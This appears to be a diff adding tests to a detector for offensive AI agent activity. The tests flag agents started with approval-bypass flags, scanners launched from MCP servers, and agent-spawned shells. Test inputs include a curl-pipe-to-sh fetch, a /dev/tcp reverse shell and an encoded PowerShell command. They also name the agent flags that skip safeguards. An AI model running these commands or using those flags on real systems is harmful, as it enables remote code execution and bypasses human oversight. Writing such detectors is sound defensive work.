@@ -148,3 +148,54 @@ def test_db_dump_bulk_and_exfil_chain():
     assert d2.evaluate({"kind": "dlp", "user": "u", "dest": "x.example", "classification": "Confidential"}, 0)[0][1]["severity"] == "high"
     assert d2.evaluate({"kind": "dlp", "user": "v", "dest": "x.example", "classification": "pii", "action": "blocked"}, 0) == []
     assert d2.evaluate({"kind": "dlp", "user": "w", "dest": "x.example", "bytes": 10}, 0) == []
+
+
+# ---------- framework focus behaviours ----------
+def test_agent_swarm_oai012():
+    d = det()
+    hits = rules(d, proc(1, 0, "claude", "claude --dangerously-skip-permissions -p w1", host="SRV-9"), 0)
+    hits += rules(d, proc(2, 0, "codex", "codex exec --dangerously-bypass-approvals-and-sandbox w2", host="SRV-9"), 5)
+    assert hits == ["OAI-012"]
+    d2 = det()  # one agent with approvals on is normal developer use
+    assert rules(d2, proc(1, 0, "claude", "claude -p 'fix tests'"), 0) == []
+    assert rules(d2, proc(2, 0, "codex", "codex exec 'refactor'"), 1) == []
+
+
+def test_mcp_launched_tools_oai013():
+    d = det()
+    rules(d, proc(10, 1, "python3", "python3 hexstrike_server.py --port 8888"), 0)
+    out = d.evaluate(proc(11, 10, "nmap", "nmap -sV 10.0.0.0/24"), 1)
+    o13 = [x for r, x in out if r == "OAI-013"]
+    assert o13 and o13[0]["severity"] == "critical" and o13[0]["framework"] == "hexstrike"
+    d2 = det()
+    rules(d2, proc(10, 1, "node", "node /opt/tools/mcp-server/index.js"), 0)
+    out = d2.evaluate(proc(11, 10, "sqlmap", "sqlmap -u x"), 1)
+    assert [x.get("severity") for r, x in out if r == "OAI-013"] == [None]  # default high
+
+
+def test_agent_dynamic_code_oai014():
+    d = det()
+    rules(d, proc(20, 1, "python3", "python3 run_ui.py --agent agent-zero"), 0)
+    assert "OAI-014" in rules(d, proc(21, 20, "bash", "bash -c 'curl -s https://x.example/a.sh | sh'"), 1)
+    out = d.evaluate(proc(22, 20, "bash", "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"), 2)
+    assert [x["severity"] for r, x in out if r == "OAI-014"] == ["critical"]
+    d2 = det()  # same command without an agent ancestor is left to other rules
+    assert rules(d2, proc(30, 1, "bash", "bash -c 'curl -s https://x.example/a.sh | sh'"), 0) == []
+    d3 = det()  # parent fields on an EDR row are enough
+    rec = proc(40, 39, "powershell.exe", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")
+    rec.update(parent_image="hermes", parent_cmdline="hermes chat --yolo")
+    assert "OAI-014" in rules(d3, rec, 0)
+
+
+def test_framework_cards_and_antifox():
+    m = oa.OffensiveAIMonitor(random.Random(1))
+    fw = {f["id"]: f for f in m.summary()["frameworks"]}
+    assert set(fw) == {"artex", "antifox", "cairn", "pentagi", "hexstrike", "cyberstrikeai", "strix", "hermes", "agent-zero"}
+    assert fw["hexstrike"]["focus"].startswith("MCP") and [r["id"] for r in fw["hexstrike"]["rules"]][0] == "OAI-013"
+    idx = oa.IndicatorIndex([{"type": "docker_image", "value": "ghcr.io/antifox-ai/antifox", "confidence": "high",
+                              "framework": "artex", "context": "AntiFox fork image"}])
+    d = det()
+    d.index = idx
+    out = d.evaluate({"kind": "process", "host": "H", "pid": 1, "ppid": 0, "image": "docker",
+                      "cmdline": "docker run ghcr.io/antifox-ai/antifox"}, 0)
+    assert [x["framework"] for r, x in out if r == "OAI-006"] == ["artex antifox"]
